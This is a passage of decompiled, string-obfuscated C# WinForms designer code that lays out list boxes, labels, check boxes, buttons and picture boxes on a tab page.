			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2BD0B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C29C64 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A105A3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6946057B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F727B00 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DE6E7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678FBCC1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2BD87 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCB77C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A639EB1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C4C72 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B7184C0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A639EFF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF9032 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678FBF57 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCB4FE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB36B9 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0FED9 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E0325 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1F03DD37 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4DA30711 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8CA7E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2BEC1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E0381 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3C0E2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49)
		});
		((Control)listBox1).Location = new Point(368, 66);
		((Control)listBox1).Margin = new Padding(5, 3, 5, 3);
		((Control)listBox1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEF86A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6);
		((Control)listBox1).Size = new Size(158, 327);
		((Control)listBox1).TabIndex = 13;
		listBox1.SelectedIndexChanged += listBox1_SelectedIndexChanged;
		((Control)label7).AutoSize = true;
		((Control)label7).ForeColor = SystemColors.ControlLightLight;
		((Control)label7).Location = new Point(834, 52);
		((Control)label7).Margin = new Padding(5, 0, 5, 0);
		((Control)label7).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F1AAF6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586);
		((Control)label7).Size = new Size(99, 19);
		((Control)label7).TabIndex = 12;
		((Control)label7).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x137404B5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		((Control)label6).AutoSize = true;
		((Control)label6).ForeColor = SystemColors.ControlLightLight;
		((Control)label6).Location = new Point(834, 146);
		((Control)label6).Margin = new Padding(5, 0, 5, 0);
		((Control)label6).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DA87D7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((Control)label6).Size = new Size(110, 19);
		((Control)label6).TabIndex = 11;
		((Control)label6).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875D42D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3);
		((Control)label5).AutoSize = true;
		((Control)label5).ForeColor = SystemColors.ControlLightLight;
		((Control)label5).Location = new Point(645, 241);
		((Control)label5).Margin = new Padding(5, 0, 5, 0);
		((Control)label5).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-836630164 ^ -818364151 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2);
		((Control)label5).Size = new Size(414, 57);
		((Control)label5).TabIndex = 10;
		((Control)label5).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F30C9 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a);
		((Control)checkBox8).AutoSize = true;
		((Control)checkBox8).ForeColor = SystemColors.ControlLightLight;
		((Control)checkBox8).Location = new Point(662, 183);
		((Control)checkBox8).Margin = new Padding(5, 3, 5, 3);
		((Control)checkBox8).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4DA30905 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee);
		((Control)checkBox8).Size = new Size(51, 23);
		((Control)checkBox8).TabIndex = 9;
		((Control)checkBox8).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12710A2E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		((ButtonBase)checkBox8).UseVisualStyleBackColor = true;
		checkBox8.CheckedChanged += checkBox8_CheckedChanged;
		((Control)checkBox7).AutoSize = true;
		((Control)checkBox7).ForeColor = SystemColors.ControlLightLight;
		((Control)checkBox7).Location = new Point(998, 183);
		((Control)checkBox7).Margin = new Padding(5, 3, 5, 3);
		((Control)checkBox7).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C4104 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970);
		((Control)checkBox7).Size = new Size(89, 23);
		((Control)checkBox7).TabIndex = 8;
		((Control)checkBox7).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DEB2F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((ButtonBase)checkBox7).UseVisualStyleBackColor = true;
		checkBox7.CheckedChanged += checkBox7_CheckedChanged;
		((Control)checkBox6).AutoSize = true;
		((Control)checkBox6).ForeColor = SystemColors.ControlLightLight;
		((Control)checkBox6).Location = new Point(840, 183);
		((Control)checkBox6).Margin = new Padding(5, 3, 5, 3);
		((Control)checkBox6).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0CF4B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e);
		((Control)checkBox6).Size = new Size(61, 23);
		((Control)checkBox6).TabIndex = 7;
		((Control)checkBox6).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13740B63 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		((ButtonBase)checkBox6).UseVisualStyleBackColor = true;
		checkBox6.CheckedChanged += checkBox6_CheckedChanged;
		((Control)checkBox5).AutoSize = true;
		((Control)checkBox5).ForeColor = SystemColors.ControlLightLight;
		((Control)checkBox5).Location = new Point(998, 87);
		((Control)checkBox5).Margin = new Padding(5, 3, 5, 3);
		((Control)checkBox5).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2BD32 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675);
		((Control)checkBox5).Size = new Size(124, 23);
		((Control)checkBox5).TabIndex = 6;
		((Control)checkBox5).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0F195 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a);
		((ButtonBase)checkBox5).UseVisualStyleBackColor = true;
		checkBox5.CheckedChanged += checkBox5_CheckedChanged;
		((Control)checkBox4).AutoSize = true;
		((Control)checkBox4).ForeColor = SystemColors.ControlLightLight;
		((Control)checkBox4).Location = new Point(840, 87);
		((Control)checkBox4).Margin = new Padding(5, 3, 5, 3);
		((Control)checkBox4).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x60583CCD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c);
		((Control)checkBox4).Size = new Size(102, 23);
		((Control)checkBox4).TabIndex = 5;
		((Control)checkBox4).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C99DA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823);
		((ButtonBase)checkBox4).UseVisualStyleBackColor = true;
		checkBox4.CheckedChanged += checkBox4_CheckedChanged;
		((Control)checkBox3).AutoSize = true;
		((Control)checkBox3).ForeColor = SystemColors.ControlLightLight;
		((Control)checkBox3).Location = new Point(662, 87);
		((Control)checkBox3).Margin = new Padding(5, 3, 5, 3);
		((Control)checkBox3).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F727720 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165);
		((Control)checkBox3).Size = new Size(108, 23);
		((Control)checkBox3).TabIndex = 4;
		((Control)checkBox3).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AE657 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549);
		((ButtonBase)checkBox3).UseVisualStyleBackColor = true;
		checkBox3.CheckedChanged += checkBox3_CheckedChanged;
		((Control)button2).BackColor = Color.FromArgb(64, 64, 64);
		((Control)button2).ForeColor = SystemColors.ControlLightLight;
		((Control)button2).Location = new Point(62, 45);
		((Control)button2).Margin = new Padding(5, 3, 5, 3);
		((Control)button2).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F3E35 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a);
		((Control)button2).Size = new Size(139, 38);
		((Control)button2).TabIndex = 1;
		((Control)button2).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1148833791 ^ -47936696 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc);
		((ButtonBase)button2).UseVisualStyleBackColor = false;
		((Control)button2).Click += button2_Click_1;
		((Control)label4).AutoSize = true;
		((Control)label4).ForeColor = SystemColors.ControlLightLight;
		((Control)label4).Location = new Point(40, 19);
		((Control)label4).Margin = new Padding(5, 0, 5, 0);
		((Control)label4).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCBB58 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6);
		((Control)label4).Size = new Size(190, 19);
		((Control)label4).TabIndex = 0;
		((Control)label4).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1831747487 ^ 0x7E5A358E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		pictureBox4.BorderStyle = (BorderStyle)2;
		((Control)pictureBox4).Location = new Point(40, 105);
		((Control)pictureBox4).Margin = new Padding(5, 3, 5, 3);
		((Control)pictureBox4).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DA895D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((Control)pictureBox4).Size = new Size(190, 202);
		pictureBox4.TabIndex = 2;
		pictureBox4.TabStop = false;
		((Control)pictureBox4).Click += pictureBox4_Click;
		((Control)tabPage1).BackColor = Color.FromArgb(16, 26, 40);
		((Control)tabPage1).Controls.Add((Control)(object)button31);
		((Control)tabPage1).Controls.Add((Control)(object)button30);
		((Control)tabPage1).Controls.Add((Control)(object)button29);
		((Control)tabPage1).Controls.Add((Control)(object)pictureBox10);
		((Control)tabPage1).Controls.Add((Control)(object)pictureBox9);
		((Control)tabPage1).Controls.Add((Control)(object)button28);
		((Control)tabPage1).Controls.Add((Control)(object)button27);
		((Control)tabPage1).Controls.Add((Control)(object)button26);
		((Control)tabPage1).Controls.Add((Control)(object)button25);
		((Control)tabPage1).Controls.Add((Control)(object)checkBox2);
		((Control)tabPage1).Controls.Add((Control)(object)checkBox1);
		((Control)tabPage1).Controls.Add((Control)(object)button24);
		((Control)tabPage1).Controls.Add((Control)(object)button23);
		((Control)tabPage1).Controls.Add((Control)(object)button22);
		((Control)tabPage1).Controls.Add((Control)(object)button21);
		((Control)tabPage1).Controls.Add((Control)(object)button20);
		((Control)tabPage1).Controls.Add((Control)(object)button19);
		((Control)tabPage1).Controls.Add((Control)(object)button18);
		((Control)tabPage1).Controls.Add((Control)(object)button17);
		((Control)tabPage1).Controls.Add((Control)(object)comboBox9);
		((Control)tabPage1).Controls.Add((Control)(object)comboBox7);
		((Control)tabPage1).Controls.Add((Control)(object)label34);
		((Control)tabPage1).Controls.Add((Control)(object)comboBox8);
		((Control)tabPage1).Controls.Add((Control)(object)label35);
		((Control)tabPage1).Controls.Add((Control)(object)textBox19);
		((Control)tabPage1).Controls.Add((Control)(object)label33);
		((Control)tabPage1).Controls.Add((Control)(object)textBox16);
		((Control)tabPage1).Controls.Add((Control)(object)textBox17);
		((Control)tabPage1).Controls.Add((Control)(object)textBox18);
		((Control)tabPage1).Controls.Add((Control)(object)label30);
		((Control)tabPage1).Controls.Add((Control)(object)label31);
		((Control)tabPage1).Controls.Add((Control)(object)label32);
		((Control)tabPage1).Controls.Add((Control)(object)label28);
		((Control)tabPage1).Controls.Add((Control)(object)label27);
		((Control)tabPage1).Controls.Add((Control)(object)textBox13);
		((Control)tabPage1).Controls.Add((Control)(object)textBox14);
		((Control)tabPage1).Controls.Add((Control)(object)textBox15);
		((Control)tabPage1).Controls.Add((Control)(object)label29);
		((Control)tabPage1).Controls.Add((Control)(object)textBox10);
		((Control)tabPage1).Controls.Add((Control)(object)textBox11);
		((Control)tabPage1).Controls.Add((Control)(object)textBox12);
		((Control)tabPage1).Controls.Add((Control)(object)label24);
		((Control)tabPage1).Controls.Add((Control)(object)label25);
		((Control)tabPage1).Controls.Add((Control)(object)label26);
		((Control)tabPage1).Controls.Add((Control)(object)comboBox6);
		((Control)tabPage1).Controls.Add((Control)(object)label23);
		((Control)tabPage1).Controls.Add((Control)(object)comboBox5);
		((Control)tabPage1).Controls.Add((Control)(object)label22);
		((Control)tabPage1).Controls.Add((Control)(object)comboBox4);
		((Control)tabPage1).Controls.Add((Control)(object)label21);
		((Control)tabPage1).Controls.Add((Control)(object)button4);
		((Control)tabPage1).Controls.Add((Control)(object)comboBox3);
		((Control)tabPage1).Controls.Add((Control)(object)comboBox2);
		((Control)tabPage1).Controls.Add((Control)(object)textBox8);
		((Control)tabPage1).Controls.Add((Control)(object)textBox7);
		((Control)tabPage1).Controls.Add((Control)(object)textBox6);
		((Control)tabPage1).Controls.Add((Control)(object)label20);
		((Control)tabPage1).Controls.Add((Control)(object)label19);
		((Control)tabPage1).Controls.Add((Control)(object)label18);
		((Control)tabPage1).Controls.Add((Control)(object)label17);
		((Control)tabPage1).Controls.Add((Control)(object)label16);
		((Control)tabPage1).Controls.Add((Control)(object)label15);
		((Control)tabPage1).Controls.Add((Control)(object)label14);
		((Control)tabPage1).Controls.Add((Control)(object)textBox5);
		((Control)tabPage1).Controls.Add((Control)(object)textBox3);
		((Control)tabPage1).Controls.Add((Control)(object)textBox1);
		((Control)tabPage1).Controls.Add((Control)(object)label13);
		((Control)tabPage1).Controls.Add((Control)(object)label12);
		((Control)tabPage1).Controls.Add((Control)(object)label3);
		((Control)tabPage1).Controls.Add((Control)(object)pictureBox8);
		((Control)tabPage1).Controls.Add((Control)(object)pictureBox7);
		((Control)tabPage1).Controls.Add((Control)(object)pictureBox3);
		((Control)tabPage1).Controls.Add((Control)(object)pictureBox6);
		((Control)tabPage1).Controls.Add((Control)(object)button16);
		((Control)tabPage1).Controls.Add((Control)(object)button15);
		((Control)tabPage1).Controls.Add((Control)(object)label11);
		((Control)tabPage1).Controls.Add((Control)(object)pictureBox5);
		((Control)tabPage1).Controls.Add((Control)(object)button14);
		((Control)tabPage1).Controls.Add((Control)(object)button13);
		((Control)tabPage1).Controls.Add((Control)(object)button12);
		((Control)tabPage1).Controls.Add((Control)(object)button11);
		((Control)tabPage1).Controls.Add((Control)(object)pictureBox1);
		((Control)tabPage1).Controls.Add((Control)(object)button1);
		((Control)tabPage1).Controls.Add((Control)(object)pictureBox2);
		((Control)tabPage1).Controls.Add((Control)(object)button3);
		((Control)tabPage1).Controls.Add((Control)(object)progressBar1);
		((Control)tabPage1).Controls.Add((Control)(object)label1);
		((Control)tabPage1).Controls.Add((Control)(object)button5);
		((Control)tabPage1).Controls.Add((Control)(object)comboBox1);
		((Control)tabPage1).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1646586438 ^ -1481078933 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		tabPage1.Location = new Point(4, 54);
		((Control)tabPage1).Margin = new Padding(0);
		((Control)tabPage1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x540441B7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d2a5bdc84a4644acb5d9fa871e9d89cc);
		((Control)tabPage1).Size = new Size(1251, 705);
		tabPage1.TabIndex = 0;
		((Control)tabPage1).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC886D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a);
		((Control)tabPage1).Click += tabPage1_Click;
		((Control)button31).BackColor = Color.Teal;
		((Control)button31).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C10D48 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button31).ForeColor = SystemColors.ControlLightLight;
		((Control)button31).Location = new Point(1125, 1);
		((Control)button31).Margin = new Padding(5, 3, 5, 3);
		((Control)button31).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12710886 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		((Control)button31).Size = new Size(107, 38);
		((Control)button31).TabIndex = 103;
		((Control)button31).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DA8AD1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((ButtonBase)button31).UseVisualStyleBackColor = false;
		((Control)button31).Click += button31_Click;
		((Control)button30).BackColor = Color.Teal;
		((Control)button30).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8C502 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button30).ForeColor = SystemColors.ControlLightLight;
		((Control)button30).Location = new Point(800, 1);
		((Control)button30).Margin = new Padding(5, 3, 5, 3);
		((Control)button30).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA039D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208);
		((Control)button30).Size = new Size(107, 38);
		((Control)button30).TabIndex = 102;
		((Control)button30).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x300288D1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9);
		((ButtonBase)button30).UseVisualStyleBackColor = false;
		((Control)button30).Click += button30_Click;
		((Control)button29).BackColor = Color.Teal;
		((Control)button29).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E0CA5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button29).ForeColor = SystemColors.ControlLightLight;
		((Control)button29).Location = new Point(415, 1);
		((Control)button29).Margin = new Padding(5, 3, 5, 3);
		((Control)button29).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACBA6D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76);
		((Control)button29).Size = new Size(107, 38);
		((Control)button29).TabIndex = 101;
		((Control)button29).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B718B56 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33);
		((ButtonBase)button29).UseVisualStyleBackColor = false;
		((Control)button29).Click += button29_Click;
		((Control)pictureBox10).Location = new Point(979, 494);
		((Control)pictureBox10).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0CDFD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e);
		((Control)pictureBox10).Size = new Size(18, 23);
		pictureBox10.SizeMode = (PictureBoxSizeMode)4;
		pictureBox10.TabIndex = 100;
		pictureBox10.TabStop = false;
		((Control)pictureBox9).Location = new Point(1089, 496);
